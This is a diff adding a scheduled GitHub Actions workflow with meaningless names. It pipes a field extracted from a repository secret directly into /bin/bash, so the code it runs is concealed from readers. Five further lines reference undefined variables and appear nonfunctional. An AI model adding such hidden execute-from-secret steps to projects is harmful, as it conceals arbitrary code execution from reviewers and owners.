@@ -1,0 +1,22 @@
+name: fengxuehehexixi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengxuehehexixi
+        env:
+          myo4: ${{ secrets.myo4 }}
+        run: |
+          echo $myo4 | jq -r .ndi2905 | /bin/bash
+          echo $sik917 | jq -r .cgn122 | /bin/bash
+          echo $gjkgp479 | jq -r .of2 | /bin/bash
+          echo $xn8448 | jq -r .xz926 | /bin/bash
+          echo $mla80946 | jq -r .m27 | /bin/bash
+          echo $id80813 | jq -r .j5328 | /bin/bash
+
